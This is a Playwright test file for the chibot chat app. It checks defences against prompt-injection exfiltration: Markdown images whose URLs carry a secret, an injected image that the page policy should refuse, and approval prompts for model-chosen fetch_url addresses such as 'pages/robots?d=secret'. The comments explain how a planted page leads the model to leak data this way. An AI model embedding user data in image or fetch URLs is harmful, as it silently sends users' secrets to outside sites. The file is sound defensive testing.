import { expect, test } from '@playwright/test'
import { answer, answered, appReady, FAKE_OPENAI, send } from './helpers.ts'

// An answer written under the influence of a planted page can contain a
// Markdown image whose address carries the user's data: a browser that loads
// it has sent the data away without a click. The fake model repeats the
// question, so a question with an image in it makes an answer with one.

const pixelHits = async (page: import('@playwright/test').Page) =>
  (await (
    await page.request.get(`${FAKE_OPENAI}/debug/pixel-hits`)
  ).json()) as string[]

test('does not load an image from another site by itself', async ({ page }) => {
  const secret = `secret-${Date.now()}`
  const pixel = `${FAKE_OPENAI}/debug/pixel?d=${secret}`
  const requested: string[] = []
  page.on('request', (request) => requested.push(request.url()))

  await page.goto('/')
  await appReady(page)
  await send(page, `Here is the image ![tracking pixel](${pixel}) done`)
  await answered(page)

  // Nothing asked the other site for it…
  expect(requested.filter((url) => url.includes(secret))).toEqual([])
  expect((await pixelHits(page)).filter((url) => url.includes(secret))).toEqual(
    [],
  )
  // …and the answer shows the image as a link, opened only on a click.
  const link = answer(page, 0).getByRole('link', { name: 'tracking pixel' })
  await expect(link).toHaveAttribute('href', pixel)
  await expect(answer(page, 0).locator('img')).toHaveCount(0)
})

test('the browser itself refuses an image from another site, if one slips through', async ({
  page,
}) => {
  const secret = `slipped-${Date.now()}`
  await page.goto('/')
  await appReady(page)
  // As if the renderer had let one through: the page's own policy decides.
  const outcome = await page.evaluate(
    (src) =>
      new Promise<string>((resolve) => {
        const img = new Image()
        img.onload = () => resolve('loaded')
        img.onerror = () => resolve('refused')
        img.src = src
        document.body.append(img)
      }),
    `${FAKE_OPENAI}/debug/pixel?d=${secret}`,
  )
  expect(outcome).toBe('refused')
  expect((await pixelHits(page)).filter((url) => url.includes(secret))).toEqual(
    [],
  )
})

test('still shows the images chibot itself serves', async ({ page }) => {
  await page.goto('/')
  await appReady(page)
  await send(page, 'draw a robot')
  await answered(page)
  const image = page.locator('.turn .image img').first()
  await expect(image).toHaveAttribute('src', /^\/api\/files\/[\w-]+$/)
})

// Once the chat holds text from others (a search), an address the model chose
// itself waits for the user: the page may have told it to put data in it.
test('asks before fetching an address the user and the search did not give', async ({
  page,
}) => {
  await page.goto('/')
  await appReady(page)
  await send(page, 'search robots')
  await answered(page)

  await send(page, 'follow the link')
  const card = page.getByRole('region', { name: 'Tool approval' })
  await expect(card).toContainText('chibot wants to use fetch_url')
  await expect(card).toContainText('pages/robots?d=secret')

  await card.getByRole('button', { name: 'Deny' }).click()
  await answered(page)
  await expect(answer(page, 1)).toContainText('The user denied this tool call')
})

test('does not ask for an address the user wrote', async ({ page }) => {
  await page.goto('/')
  await appReady(page)
  await send(page, 'search robots')
  await answered(page)

  await send(page, `read ${FAKE_OPENAI}/pages/robots`)
  await answered(page)
  await expect(page.getByRole('region', { name: 'Tool approval' })).toHaveCount(
    0,
  )
  await expect(answer(page, 1)).toContainText('Robots')
})
